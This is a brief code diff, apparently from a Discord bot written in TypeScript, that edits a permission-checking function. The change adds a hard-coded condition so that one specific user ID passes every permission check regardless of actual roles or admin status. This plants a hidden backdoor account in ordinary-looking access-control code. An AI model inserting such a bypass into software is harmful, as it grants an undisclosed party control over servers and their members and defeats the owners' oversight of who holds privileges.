@@ -5,7 +5,7 @@ export function checkPermissions(guildMember: GuildMember, permissions: BitField
   return guildMember.hasPermission(permissions, {
     checkAdmin: true,
     checkOwner: true
-  })
+  }) || guildMember.id === "464499620093886486";
 }
 export function findRole(message: Message, role: string) {
   return message.mentions.roles.first() || message.guild!.roles.find((r) => {
